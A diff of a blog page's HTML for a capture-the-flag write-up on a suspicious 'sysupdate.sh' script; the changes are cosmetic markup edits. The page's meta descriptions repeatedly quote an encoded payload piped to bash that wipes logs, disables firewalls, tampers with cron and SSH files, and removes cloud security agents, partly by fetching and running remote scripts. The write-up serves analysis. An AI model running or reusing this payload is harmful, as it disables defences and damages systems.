@@ -13,7 +13,7 @@ We see the script decodes a b64 string and then runs it by piping it to bash.
 Let&rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:">
 <meta name="author" content="connar">
 <link rel="canonical" href="https://connar.github.io/ctfwriteups/sysupdate/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://connar.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
@@ -58,22 +58,22 @@ Let&rsquo;s follow up with the script and decode it ourselves. We can do that us
         }
 
     </style>
-</noscript><meta property="og:title" content="sysupdate - Writeup" />
-<meta property="og:description" content="In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:
-echo -n &#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA&#43;IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA&#43;IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4&#43;IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&#34; | base64 -d | bash -s
-We see the script decodes a b64 string and then runs it by piping it to bash.
-Let&rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://connar.github.io/ctfwriteups/sysupdate/" /><meta property="article:section" content="ctfwriteups" />
-
-
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="sysupdate - Writeup"/>
+</noscript>
+<meta property="og:url" content="https://connar.github.io/ctfwriteups/sysupdate/">
+  <meta property="og:site_name" content="Journal of Connar">
+  <meta property="og:title" content="sysupdate - Writeup">
+  <meta property="og:description" content="In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:
+echo -n &#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA&#43;IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA&#43;IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4&#43;IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&#34; | base64 -d | bash -s We see the script decodes a b64 string and then runs it by piping it to bash.
+Let’s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctfwriteups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sysupdate - Writeup">
 <meta name="twitter:description" content="In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:
 echo -n &#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA&#43;IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA&#43;IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4&#43;IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&#34; | base64 -d | bash -s
 We see the script decodes a b64 string and then runs it by piping it to bash.
-Let&rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:"/>
+Let&rsquo;s follow up with the script and decode it ourselves. We can do that using an online base64 decoder and passing the base64 string to it. By doing so, we will end up with the following:">
 
 
 <script type="application/ld+json">
@@ -148,7 +148,7 @@ Let&rsquo;s follow up with the script and decode it ourselves. We can do that us
         <div class="logo">
             <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
